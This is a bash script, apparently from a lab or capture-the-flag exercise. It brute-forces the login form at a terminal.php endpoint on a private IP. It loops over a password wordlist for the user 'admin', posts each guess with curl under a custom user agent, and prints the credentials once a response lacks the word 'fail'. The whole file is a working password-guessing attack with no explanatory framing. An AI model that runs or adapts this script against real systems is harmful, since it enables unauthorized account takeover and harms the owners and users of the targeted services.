#!/usr/bin/env bash

# bruteForce script using cURL

WORDLIST="./small.txt"
USERNAME="admin"
URL="http://10.66.175.154/terminal.php?action=login"
UA="secretcomputer"

TOTAL=$(wc -l < "$WORDLIST")
COUNT=0

echo "[*] Starting brute-force on $TOTAL passwords..."

while IFS= read -r PASSWORD; do
  ((COUNT++))

  RESPONSE=$(curl -s -A "$UA" -X POST "$URL" \
    -d "username=$USERNAME&password=$PASSWORD")

  # Show progress counter only
  echo -ne "\r[*] Attempted: $COUNT / $TOTAL"

  if [[ "$RESPONSE" != *"fail"* ]]; then
    echo -e "\n\n[+] SUCCESS!"
    echo "[+] Username: $USERNAME"
    echo "[+] Password: $PASSWORD"
    echo "[+] Server Response: $RESPONSE"
    exit 0
  fi
done < "$WORDLIST"

echo -e "\n[-] Brute-force failed. No valid credentials found."

